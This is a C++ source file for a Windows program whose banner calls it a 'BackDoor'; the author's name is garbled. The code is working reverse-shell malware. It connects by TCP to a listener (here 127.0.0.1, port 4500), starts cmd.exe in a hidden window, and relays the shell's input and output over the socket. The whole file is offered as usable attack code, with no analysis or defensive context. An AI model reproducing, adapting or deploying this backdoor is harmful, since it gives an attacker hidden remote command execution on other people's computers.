// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

SOCKET s;
HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;

DWORD WINAPI Thread2( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD nByteToWrite, nByteWritten;
	char recv_buff[1024];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	CreatePipe(&hReadPipe,
		&hWriteFile,
		&sa,
		0);
	
	
	while(true)
	{
		Sleep(250);
		nByteToWrite = recv(s ,
			recv_buff,
			1024,
			0);
		
		WriteFile(hWriteFile,
			recv_buff,
			nByteToWrite,
			&nByteWritten,
			NULL);
	}
	return 0;
}

DWORD WINAPI Thread1( LPVOID lpParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD len;
	char send_buff[2048];
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	CreatePipe(&hReadFile,
		&hWritePipe,
		&sa,
		0);
	
	
	while (true)
	{
		ReadFile(hReadFile,
			send_buff,
			2048,
			&len,
			NULL);
		
		send(s,
			send_buff,
			len,
			0);
	}
	return 0;
}


int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by ÈÏÕæµÄÑ©  ========================\r\n";
    HANDLE hThread[2];
	DWORD dwThreadIdA,dwThreadIdB,dwThreadParam=0;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf(" socket error \n");
		return 0;
	}
	sockaddr_in sin; 
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	if(connect(s, (sockaddr*)&sin, sizeof(sin)) == -1)
	{
		printf(" connect error \n");
		return 0;
	}
    hThread[0]=CreateThread(NULL, 0, Thread1, NULL, 0, &dwThreadIdA);
	hThread[1]=CreateThread(NULL, 0, Thread2, NULL, 0, &dwThreadIdB);
    Sleep(1000);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput = hReadPipe;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = SW_HIDE;
	char cmdline[256]={0};
	GetSystemDirectory(cmdline,sizeof(cmdline));
    strcat(cmdline,"\\cmd.exe");
	if (CreateProcess(cmdline, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == 0)
	{
		printf ("CreateProcess Error \n");
		return 0;
	}
	
	
	if (send(s,wMessage,strlen(wMessage),0)==SOCKET_ERROR)
	{
        printf("Send message error \n");
        return 0;
	}
	WaitForMultipleObjects(2,hThread,true,INFINITE);
	
	return 0;
}
